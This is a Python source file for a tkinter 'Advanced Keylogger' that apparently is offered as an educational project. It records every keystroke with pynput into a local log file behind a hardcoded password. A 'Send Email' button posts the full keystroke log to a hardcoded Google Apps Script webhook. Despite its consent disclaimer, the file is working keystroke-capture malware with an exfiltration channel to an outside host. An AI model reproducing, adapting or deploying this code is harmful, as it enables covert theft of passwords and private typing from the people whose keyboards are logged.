import logging
import threading
import tkinter as tk
from tkinter import ttk, filedialog, messagebox
from pynput import keyboard
from tkinter.simpledialog import askstring
import requests
import json
import os

incorrect_attempts = 0

def ask_password():
    global incorrect_attempts
    password = askstring("Password", "Enter the password to open the keylogger:")
    if password != "krishiv1":  # Replace "krishiv1" with your actual password
        incorrect_attempts += 1
        if incorrect_attempts >= 3:
            tk.messagebox.showwarning("Incorrect Password", "Incorrect password. Maximum attempts reached. Exiting.")
            root.quit()
        else:
            tk.messagebox.showwarning("Incorrect Password", "Incorrect password. Please try again.")
            ask_password()
    else:
        initialize_keylogger()

def send_webhook_request():
    global log_file
    with open(log_file, "r") as f:
        log_content = f.read()
    payload = {
        "keylog_data": log_content
    }
    try:
        headers = {"Content-Type": "application/json"}
        response = requests.post("https://script.google.com/macros/s/AKfycbzmBxsOQq0_Ge7TQJ9uI7hHXcCHx9n_EDINReF51fKkgrva3jhsV3xXGOOXOyNLXPBa/exec", json=payload, headers=headers)
        if response.status_code == 200:
            tk.messagebox.showinfo("Webhook Sent", "Webhook request sent successfully!")
        else:
            tk.messagebox.showwarning("Webhook Error", "Failed to send webhook request.")
    except requests.exceptions.RequestException:
        tk.messagebox.showerror("Webhook Error", "Failed to connect to the webhook URL.")

def clear_logs():
    global log_file
    if os.path.exists(log_file):
        with open(log_file, "w") as f:
            f.write("")
        tk.messagebox.showinfo("Logs Cleared", "Log file has been cleared successfully.")
        update_log()
    else:
        tk.messagebox.showwarning("File Not Found", "Log file not found. Nothing to clear.")

def initialize_keylogger():
    global log_file
    log_file = "keylog.txt"
    logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s [%(levelname)s]: %(message)s')

    # Keylogger class
    class Keylogger:
        def __init__(self):
            self.keys = []
            self.running = False
            self.listener = None

        def on_press(self, key):
            try:
                logging.info(f"Key pressed: {key.char}")
                self.keys.append(key.char)

            except AttributeError:
                logging.info(f"Special key pressed: {key}")

        def write_to_file(self):
            with open(log_file, "a") as f:
                f.write(''.join(self.keys))
            self.keys = []

        def start(self):
            self.running = True
            self.listener = keyboard.Listener(on_press=self.on_press)
            self.listener.start()

        def stop(self):
            self.running = False
            if self.listener:
                self.listener.stop()

    def toggle_keylogger():
        if keylogger.running:
            keylogger.stop()
            on_off_label.config(text="OFF", fg="red")
            pause_resume_button.config(state=tk.DISABLED)
        else:
            keylogger.start()
            on_off_label.config(text="ON", fg="green")
            pause_resume_button.config(state=tk.NORMAL)

    def pause_resume_keylogger():
        if keylogger.running:
            keylogger.stop()
            pause_resume_button.config(text="Resume")
        else:
            keylogger.start()
            pause_resume_button.config(text="Pause")

    def clear_log():
        with open(log_file, "w") as f:
            f.write("Logs cleared!")
        update_log()

    def save_log():
        dest_file = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text Files", "*.txt"), ("All Files", "*.*")])
        if dest_file:
            with open(log_file, "r") as f_read:
                logs = f_read.read()
                with open(dest_file, "w") as f_write:
                    f_write.write(logs)
            tk.messagebox.showinfo("Log Saved", "Log saved successfully!")

    def on_about():
        about_text = """
        Advanced Keylogger v1.0
        
        This keylogger is designed for educational purposes only.
        Use it responsibly and always obtain proper consent from the user.
        Misuse of this tool for any malicious activities is illegal.
        
        Created for the educational project by Krishiv Patel.
        """
        about_window = tk.Toplevel(root)
        about_window.title("About")
        about_label = tk.Label(about_window, text=about_text, font=("Helvetica", 14), fg="#000000", bg="#ffffff", padx=10, pady=10)
        about_label.pack()

    def start_background_keylogger():
        toggle_keylogger()

    def stop_background_keylogger():
        keylogger.stop()
        on_off_label.config(text="OFF", fg="red")  # Update status to OFF

    def update_log():
        try:
            with open(log_file, "r") as f:
                logs = f.read()
                log_text.delete("1.0", tk.END)
                log_text.insert(tk.END, logs)
                log_text.see(tk.END)  # Auto-scroll to the end
        except FileNotFoundError:
            logging.warning("Keylog file not found.")
        root.after(1000, update_log)

    # Initialize the Keylogger instance
    keylogger = Keylogger()

    root = tk.Tk()
    root.title("Advanced Keylogger")
    root.geometry("1000x600")
    root.configure(bg="#333333")

    root.grid_rowconfigure(1, weight=1)
    root.grid_columnconfigure(0, weight=1)

    title_label = tk.Label(root, text="Advanced Keylogger", font=("Helvetica", 28, "bold"), fg="#ffffff", bg="#333333")
    title_label.grid(row=0, column=0, pady=20)

    log_frame = tk.Frame(root, bg="#333333")
    log_frame.grid(row=1, column=0, sticky="nsew", padx=20, pady=10)

    log_text = tk.Text(log_frame, wrap=tk.WORD, font=("Courier", 12), fg="#ffffff", bg="#444444")
    log_text.pack(fill=tk.BOTH, expand=True)

    log_scroll = ttk.Scrollbar(log_frame, command=log_text.yview)
    log_text.config(yscrollcommand=log_scroll.set)
    log_scroll.pack(side=tk.RIGHT, fill=tk.Y)

    update_log()

    button_frame = tk.Frame(root, bg="#333333")
    button_frame.grid(row=2, column=0, pady=20)

    start_background_button = tk.Button(button_frame, text="Start Keylogger", font=("Helvetica", 14), fg="#ffffff", bg="#55dd55", command=start_background_keylogger)
    start_background_button.pack(side=tk.LEFT, padx=10)

    stop_button = tk.Button(button_frame, text="Stop Keylogger", font=("Helvetica", 14), fg="#ffffff", bg="#dd5555", command=stop_background_keylogger)
    stop_button.pack(side=tk.LEFT, padx=10)

    pause_resume_button = tk.Button(button_frame, text="Pause", font=("Helvetica", 14), fg="#ffffff", bg="#ddaa00", command=pause_resume_keylogger, state=tk.DISABLED)
    pause_resume_button.pack(side=tk.LEFT, padx=10)

    save_button = tk.Button(button_frame, text="Save Log", font=("Helvetica", 14), fg="#ffffff", bg="#55aadd", command=save_log)
    save_button.pack(side=tk.LEFT, padx=10)

    send_email_button = tk.Button(button_frame, text="Send Email", font=("Helvetica", 14), fg="#ffffff", bg="#dd55dd", command=send_webhook_request)
    send_email_button.pack(side=tk.LEFT, padx=10)

    about_button = tk.Button(button_frame, text="About", font=("Helvetica", 14), fg="#ffffff", bg="#5555dd", command=on_about)
    about_button.pack(side=tk.RIGHT, padx=10)

    on_off_label = tk.Label(root, text="OFF", font=("Helvetica", 18, "bold"), fg="red", bg="#333333")
    on_off_label.grid(row=3, column=0)

    clear_logs_button = tk.Button(button_frame, text="Clear Logs", font=("Helvetica", 14), fg="#ffffff", bg="#aa55dd", command=clear_logs)
    clear_logs_button.pack(side=tk.LEFT, padx=10)

    root.mainloop()

ask_password()
